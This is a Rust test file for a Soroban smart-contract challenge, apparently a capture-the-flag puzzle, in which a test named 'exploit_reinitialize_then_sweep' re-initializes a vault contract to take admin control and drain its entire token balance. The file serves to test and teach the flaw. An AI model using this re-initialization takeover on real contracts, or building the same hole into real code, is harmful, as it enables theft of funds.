extern crate std;

use super::{Crown, CrownClient};
use soroban_sdk::{
    Address, Env, IntoVal,
    testutils::{Address as _, MockAuth, MockAuthInvoke},
    token::{StellarAssetClient, TokenClient},
};

const VAULT: i128 = 1_000 * 10_000_000;

fn setup() -> (Env, CrownClient<'static>, TokenClient<'static>, Address) {
    let env = Env::default();
    env.mock_all_auths();
    let player = Address::generate(&env);
    let issuer = Address::generate(&env);
    let asset = env.register_stellar_asset_contract_v2(issuer);
    let id = env.register(Crown, (&player, &asset.address()));
    StellarAssetClient::new(&env, &asset.address()).mint(&id, &VAULT);
    env.set_auths(&[]);
    let client = CrownClient::new(&env, &id);
    let token = TokenClient::new(&env, &asset.address());
    (env, client, token, player)
}

/// Authorize `who` for exactly one call on the vault.
fn auth_only(env: &Env, vault: &Address, who: &Address, fn_name: &'static str, arg: &Address) {
    env.mock_auths(&[MockAuth {
        address: who,
        invoke: &MockAuthInvoke {
            contract: vault,
            fn_name,
            args: (arg,).into_val(env),
            sub_invokes: &[],
        },
    }]);
}

#[test]
fn starts_owned_by_the_vault_itself() {
    let (_env, client, _token, player) = setup();
    assert_eq!(client.admin(), client.address);
    assert_eq!(client.balance(), VAULT);
    assert!(!client.is_solved(&player));
}

#[test]
fn nobody_can_sweep_before_the_takeover() {
    let (env, client, token, player) = setup();
    auth_only(&env, &client.address, &player, "sweep", &player);
    assert!(client.try_sweep(&player).is_err());
    assert_eq!(token.balance(&player), 0);
    assert_eq!(client.balance(), VAULT);
}

#[test]
fn initialize_needs_the_new_admins_signature() {
    let (_env, client, _token, player) = setup();
    assert!(client.try_initialize(&player).is_err());
    assert_eq!(client.admin(), client.address);
}

/// The exploit: initialize again, then sweep.
#[test]
fn exploit_reinitialize_then_sweep() {
    let (env, client, token, player) = setup();

    auth_only(&env, &client.address, &player, "initialize", &player);
    client.initialize(&player);
    assert_eq!(client.admin(), player);
    assert!(client.is_solved(&player));

    auth_only(&env, &client.address, &player, "sweep", &player);
    client.sweep(&player);
    assert_eq!(token.balance(&player), VAULT);
    assert_eq!(client.balance(), 0);
}

#[test]
fn the_new_admin_is_the_only_one_who_can_sweep() {
    let (env, client, token, player) = setup();
    let other = Address::generate(&env);

    auth_only(&env, &client.address, &player, "initialize", &player);
    client.initialize(&player);

    auth_only(&env, &client.address, &other, "sweep", &other);
    assert!(client.try_sweep(&other).is_err());
    assert_eq!(token.balance(&other), 0);
}

#[test]
fn only_the_owner_can_solve_their_instance() {
    let (env, client, _token, _player) = setup();
    let other = Address::generate(&env);
    auth_only(&env, &client.address, &other, "initialize", &other);
    client.initialize(&other);
    assert!(!client.is_solved(&other));
}
